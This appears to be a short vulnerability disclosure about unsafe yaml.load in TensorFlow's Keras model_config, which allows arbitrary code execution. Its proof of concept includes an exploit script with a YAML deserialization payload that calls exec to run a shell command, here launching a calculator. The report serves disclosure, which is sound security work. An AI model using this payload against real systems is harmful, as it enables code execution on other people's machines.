# Description
TensorFlow is an end-to-end open source platform for machine learning. It has a comprehensive, flexible ecosystem of tools, libraries, and community resources that lets researchers push the state-of-the-art in ML and developers easily build and deploy ML-powered applications.
* **Vulnerability description**
unsafe loading of data by the yaml.load function leading to Arbitrary code execution.
# Proof of Concept
* Vulnerable code part 
```python
    config = yaml.load(yaml_string)
    //https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/keras/saving/model_config.py#L103
```
1. run exploit.py
```python
# exploit.py
import os
os.system('pip install tensorflow')
from tensorflow.python.keras.saving import model_config
payload = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
model_config.model_from_yaml(payload,None)
```

